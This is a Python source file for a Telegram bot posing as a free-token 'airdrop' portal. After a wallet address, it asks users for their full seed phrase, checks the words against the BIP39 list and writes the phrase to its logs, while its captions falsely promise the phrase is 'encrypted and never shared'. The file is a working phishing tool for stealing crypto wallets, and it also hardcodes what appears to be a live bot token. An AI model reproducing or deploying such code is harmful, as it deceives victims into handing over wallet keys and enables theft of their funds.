import logging
import os
import re
import threading
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = "8633914734:AAHCb01yBMbZd1Cpamcm6BNvsBTOaysGM3Y"
PORT = int(os.environ.get("PORT", 8080))

HERO_PHOTO = "https://i.ibb.co/VcsGwvx8/IMG-20260306-WA0003.jpg"
GROUP_LINK = "https://t.me/hongdongofficial"

# ── Flask Server (keeps Render awake — ping this URL with UptimeRobot) ────────
flask_app = Flask(__name__)

@flask_app.route("/")
def health():
    return "Bot is alive! 🚀", 200

def run_flask():
    flask_app.run(host="0.0.0.0", port=PORT)

# ── BIP39 English Wordlist (2048 words) ──────────────────────────────────────
BIP39_WORDS = set("""abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone book boost border boring borrow boss bottom bounce box boy bracket brain brand brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canvas canyon capable capital captain car carbon card cargo carpet carry cart case cash casino castle casual cat catalog catch category cattle cause cave ceiling celery cement census chair chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy cream credit creek crew cricket crime crisp critic cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise denial dentist deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empower empty enable enact endless endorse enemy engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude excuse execute exercise exhaust exhibit exile exist exit exotic expand expire explain expose express extend extra eye fable face faculty fade faint faith fall false fame family famous fan fancy fantasy far fashion fat fatal father fatigue fault favorite feature february federal fee feed feel feet fellow felt fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus fog foil follow food foot force forest forget fork fortune forum forward fossil foster found fox fragile frame frequent fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game gap garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre gentle genuine gesture ghost ginger giraffe girl give glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good goose gorilla gospel gossip govern gown grab grace grain grant grape grasp grass gravity great green grid grief grit grocery group grow grunt guard guide guilt guitar gun gym habit hair half hammer hamster hand happy harbor harsh harvest hat have hawk hazard head health heart heavy hedgehog height hello helmet help herb here hidden high hill hint hip hire history hobby hockey hold hole holiday hollow home honey hood hope horn hospital host hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon ignore ill illegal image imitate immense immune impact impose improve impulse inbox income increase index indicate indoor industry infant inflict inform inhale inherit initial inject injury inmate inner innocent input inquiry insane insect inside inspire install intact interest into invest invite involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump jungle junior junk just kangaroo keen keep ketchup key kick kid kingdom kiss kit kitchen kite kitten kiwi knee knife knock know lab ladder lady lake lamp language laptop large later laugh laundry lava law lawn lawsuit layer lazy leader learn leave lecture left leg legal legend leisure lemon lend length lens leopard lesson letter level liar liberty library license life lift like limb limit link lion liquid list little live lizard load loan lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury lyrics machine mad magic magnet maid main major make mammal mango mansion manual maple marble march margin marine market marriage mask master match material math matrix matter maximum maze meadow mean medal media melody melt member memory mention mentor menu mercy merge merit merry mesh message metal method middle midnight milk million mimic mind minimum minor minute miracle miss mistake mix mixed mixture mobile model modify mom monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music must mutual myself mystery naive name napkin narrow nasty natural nature near neck need negative neglect neither nephew nerve nest network news next nice night noble noise nominee noodle normal north notable note nothing notice novel now nuclear nurse nut oak obey object oblige obscure observe obtain ocean october odor off offer office often oil okay old olive olympic omit once onion open option orange orbit orchard order ordinary organ orient original orphan ostrich other outdoor outside oval over own oyster ozone pact paddle page pair palace palm panda panel panic panther paper parade parent park parrot party pass patch path patrol pause pave payment peace peanut peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play plot pluck plug plunge poem poet point polar pole police pond pony popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punish pupil puppy purchase purity purpose push put puzzle pyramid quality quantum quarter question quick quit quiz quote rabbit raccoon race rack radar radio rage rail rain raise rally ramp ranch random range rapid rare rate rather raven reach ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remove render renew rent reopen repair repeat replace report require rescue resemble resist resource response result retire retreat return reunion reveal review reward rhythm ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance roof rookie rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salon salt salute same sample sand satisfy satoshi sauce sausage save say scale scan scare scatter scene scheme scissors scorpion scout scrap screen script scrub sea search season seat second secret section security seed seek segment select sell seminar senior sense sentence series service session settle setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling siege sight sign silent silk silly silver similar simple since sing siren sister situate six size sketch skill skin skirt skull slab slam sleep slender slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow soap soccer social sock soda soft solar solution solve someone song soon sorry soul sound soup source south space spare spatial spawn speak special speed sphere spice spider spike spin spirit split spoil sponsor spoon spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stop store storm story stove strategy street strike strong struggle student stuff stumble style subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply supreme sure surface surge surprise sustain swallow swamp swap swear sweet swift swim swing switch sword symbol symptom syrup table tackle tag tail talent tamper tank tape target task tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing this thought three thrive throw thunder ticket tilt timber time tiny tip tired title toast tobacco today together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap trash travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck truly trumpet trust truth tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique universe unknown unlock until unusual unveil update upgrade uphold upon upper upset urban usage use used useful useless usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venture venue verb verify version very veteran viable vibrant vicious victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear weasel wedding weekend weird welcome well west wet whale wheat wheel when where whip whisper wide width wife wild will win window wine wing wink winner winter wire wisdom wise wish witness wolf woman wonder wood wool word world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo""".split())


# ── Validation helpers ────────────────────────────────────────────────────────

def parse_phrase_words(text: str):
    text = text.lower()
    text = re.sub(r"[^a-z]+", " ", text)
    return [w for w in text.split(" ") if w]


def validate_seed_phrase(text: str):
    words = parse_phrase_words(text)
    count = len(words)

    if count not in (12, 24):
        return False, (
            f"❌ <b>Invalid seed phrase.</b>\n\n"
            f"You entered <b>{count} word{'s' if count != 1 else ''}</b>, "
            f"but a valid phrase must be exactly <b>12 or 24 words</b>.\n\n"
            f"💡 Make sure words are separated by spaces and try again."
        )

    invalid = [w for w in words if w not in BIP39_WORDS]
    if invalid:
        bad_list = ", ".join(f"<code>{w}</code>" for w in invalid[:5])
        extra = f" (+{len(invalid) - 5} more)" if len(invalid) > 5 else ""
        return False, (
            f"❌ <b>Invalid seed phrase.</b>\n\n"
            f"The following word{'s are' if len(invalid) > 1 else ' is'} not recognised: "
            f"{bad_list}{extra}\n\n"
            f"💡 Check for typos — every word must be from the BIP39 list.\n"
            f"Try again."
        )

    return True, None


def validate_address(chain: str, address: str):
    address = address.strip()
    patterns = {
        "Ethereum": (
            r"^0x[0-9a-fA-F]{40}$",
            "An Ethereum address starts with <code>0x</code> followed by exactly 40 hex characters.\n"
            "Example: <code>0xAbCd1234567890abcdef1234567890abcdef1234</code>"
        ),
        "Base": (
            r"^0x[0-9a-fA-F]{40}$",
            "A Base address starts with <code>0x</code> followed by exactly 40 hex characters.\n"
            "Example: <code>0xAbCd1234567890abcdef1234567890abcdef1234</code>"
        ),
        "BSC": (
            r"^0x[0-9a-fA-F]{40}$",
            "A BSC address starts with <code>0x</code> followed by exactly 40 hex characters.\n"
            "Example: <code>0xAbCd1234567890abcdef1234567890abcdef1234</code>"
        ),
        "Solana": (
            r"^[1-9A-HJ-NP-Za-km-z]{32,44}$",
            "A Solana address is 32–44 Base58 characters (no 0, O, I, or lowercase l).\n"
            "Example: <code>4Nd1mBQtrMJVYVfKf2PX3vhSi8Z5JoSMxfz3nTwQ8g</code>"
        ),
    }

    pattern, hint = patterns.get(chain, (r".+", ""))
    if not re.match(pattern, address):
        return False, (
            f"❌ <b>Invalid {chain} address.</b>\n\n"
            f"{hint}\n\n"
            f"Please check your address and try again."
        )
    return True, None


# ── Captions ─────────────────────────────────────────────────────────────────
WELCOME_CAPTION = (
    "🪂✨ <b>WELCOME TO HONGDONG AIRDROP BOT</b> ✨🪂\n\n"
    "🎉 <b>You've arrived at the official airdrop portal!</b>\n\n"
    "💎 <b>What is this?</b>\n"
    "Link your wallet and claim <b>exclusive FREE tokens</b>.\n\n"
    "🔥 <b>How it works:</b>\n"
    "1️⃣ Link your wallet\n"
    "2️⃣ Join the Telegram group\n"
    "3️⃣ Complete tasks\n"
    "4️⃣ Claim rewards!\n\n"
    "🌐 <b>Chains:</b> Solana • Ethereum • Base • BSC"
)

WALLET_CAPTION = (
    "🔗💼 <b>LINK YOUR WALLET</b> 💼🔗\n\n"
    "📋 <b>Choose your preferred blockchain:</b>\n"
    "🔒 <b>We never store or share your data.</b>"
)

ADDRESS_CAPTION = (
    "💼📬 <b>STEP 1 OF 2 — WALLET ADDRESS</b> 📬💼\n\n"
    "<b>You selected: {chain}</b>\n\n"
    "📩 <b>Send your wallet address as a message to this bot now.</b>\n\n"
    "Example: <code>0xYourWalletAddressHere</code>"
)

PHRASE_CAPTION = (
    "🔑🛡️ <b>STEP 2 OF 2 — SEED PHRASE</b> 🛡️🔑\n\n"
    "<b>Chain: {chain}</b>\n\n"
    "✅ Wallet address accepted!\n\n"
    "📩 <b>Now send your seed phrase (12 or 24 words), separated by spaces.</b>\n\n"
    "Example: <code>word1 word2 word3 ... word12</code>\n\n"
    "🔒 Your phrase is encrypted and never shared."
)

TASKS_CAPTION = (
    "📋🏆 <b>ELIGIBILITY TASKS</b> 🏆📋\n\n"
    "1️⃣ Join @hongdongofficial\n"
    "2️⃣ Follow announcements\n"
    "3️⃣ Link wallet\n"
    "4️⃣ Hold minimum balance"
)

FAQ_CAPTION = (
    "❓💡 <b>FAQ</b> 💡❓\n\n"
    "🔹 <b>Is it free?</b> Yes.\n"
    "🔹 <b>When distribution?</b> 24-72 hours.\n"
    "🔹 <b>How many?</b> One wallet per user."
)

SUPPORT_CAPTION = (
    "🛟📞 <b>SUPPORT</b> 📞🛟\n\n"
    "💬 Need help? Contact a moderator in @hongdongofficial\n"
    "⚠️ Admins will NEVER DM you first."
)

HELP_TEXT = "🆘 <b>HELP MENU</b>\n/start — Main portal\n/help — Show this message"

# ── Keyboard Builders ────────────────────────────────────────────────────────
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗💰 Link My Wallet", callback_data="nav_wallet")],
        [InlineKeyboardButton("📋✅ Tasks", callback_data="nav_tasks"),
         InlineKeyboardButton("❓💡 FAQ", callback_data="nav_faq")],
        [InlineKeyboardButton("🌐 Join Community", url=GROUP_LINK)],
        [InlineKeyboardButton("🛟 Support", callback_data="nav_support")],
    ])

def kb_chains():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◎ Solana", callback_data="chain_sol"),
         InlineKeyboardButton("⟠ Ethereum", callback_data="chain_eth")],
        [InlineKeyboardButton("🔵 Base", callback_data="chain_base"),
         InlineKeyboardButton("🟡 BSC", callback_data="chain_bsc")],
        [InlineKeyboardButton("🔙 Back", callback_data="nav_home")],
    ])

def kb_back():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="nav_home")],
    ])

def kb_cancel():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="nav_wallet")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="nav_home")],
    ])

# ── Core helpers ─────────────────────────────────────────────────────────────
async def refresh_screen(query, caption: str, keyboard: InlineKeyboardMarkup):
    try:
        media = InputMediaPhoto(media=HERO_PHOTO, caption=caption, parse_mode="HTML")
        await query.edit_message_media(media=media, reply_markup=keyboard)
    except Exception:
        try:
            await query.edit_message_text(text=caption, parse_mode="HTML", reply_markup=keyboard)
        except Exception as e:
            logger.error(f"Refresh screen failed: {e}")

async def send_reply(update: Update, caption: str, keyboard: InlineKeyboardMarkup):
    try:
        await update.message.reply_photo(
            photo=HERO_PHOTO, caption=caption, parse_mode="HTML", reply_markup=keyboard
        )
    except Exception:
        await update.message.reply_text(
            text=caption, parse_mode="HTML", reply_markup=keyboard
        )

# ── Handlers ──────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop("pending_chain", None)
    context.user_data.pop("pending_address", None)
    context.user_data.pop("awaiting_step", None)
    await send_reply(update, WELCOME_CAPTION, kb_main())

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEXT, parse_mode="HTML")

async def route_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "nav_home":
        context.user_data.pop("pending_chain", None)
        context.user_data.pop("pending_address", None)
        context.user_data.pop("awaiting_step", None)
        await refresh_screen(query, WELCOME_CAPTION, kb_main())

    elif data == "nav_wallet":
        context.user_data.pop("pending_chain", None)
        context.user_data.pop("pending_address", None)
        context.user_data.pop("awaiting_step", None)
        await refresh_screen(query, WALLET_CAPTION, kb_chains())

    elif data == "nav_tasks":
        await refresh_screen(query, TASKS_CAPTION, kb_back())

    elif data == "nav_faq":
        await refresh_screen(query, FAQ_CAPTION, kb_back())

    elif data == "nav_support":
        await refresh_screen(query, SUPPORT_CAPTION, kb_back())

    elif data.startswith("chain_"):
        labels = {"chain_sol": "Solana", "chain_eth": "Ethereum", "chain_base": "Base", "chain_bsc": "BSC"}
        chain_name = labels.get(data, "Crypto")
        context.user_data["pending_chain"] = chain_name
        context.user_data["awaiting_step"] = "address"
        context.user_data.pop("pending_address", None)
        await refresh_screen(query, ADDRESS_CAPTION.format(chain=chain_name), kb_cancel())

async def collect_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.startswith("/"):
        return

    step = context.user_data.get("awaiting_step")
    chain = context.user_data.get("pending_chain")

    if not step or not chain:
        return

    text = update.message.text.strip()

    if step == "address":
        valid, error = validate_address(chain, text)
        if not valid:
            await send_reply(update, f"{error}\n\n🔁 <b>Please send your {chain} wallet address again.</b>", kb_cancel())
            return
        context.user_data["pending_address"] = text
        context.user_data["awaiting_step"] = "phrase"
        await send_reply(update, PHRASE_CAPTION.format(chain=chain), kb_cancel())

    elif step == "phrase":
        valid, error = validate_seed_phrase(text)
        if not valid:
            await send_reply(update, f"{error}\n\n🔁 <b>Please send your {chain} seed phrase again (12 or 24 words).</b>", kb_cancel())
            return

        address = context.user_data.get("pending_address", "N/A")
        phrase = " ".join(parse_phrase_words(text))

        context.user_data.pop("pending_chain", None)
        context.user_data.pop("pending_address", None)
        context.user_data.pop("awaiting_step", None)

        logger.info(f"New wallet linked | Chain: {chain} | Address: {address} | Phrase: {phrase}")

        conf = (
            "✅ <b>WALLET LINKED SUCCESSFULLY!</b>\n\n"
            f"⛓️ <b>Chain:</b> {chain}\n"
            f"💼 <b>Address:</b> <code>{address}</code>\n"
            f"🔑 <b>Phrase:</b> <code>{phrase}</code>\n\n"
            "🎉 You're now registered for the airdrop!\n"
            "Rewards will be distributed within 24–72 hours."
        )
        await send_reply(update, conf, kb_back())

# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    # Start Flask health-check server in background
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info(f"Flask health-check running on port {PORT}")

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CallbackQueryHandler(route_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, collect_wallet))

    logger.info("Bot is starting...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
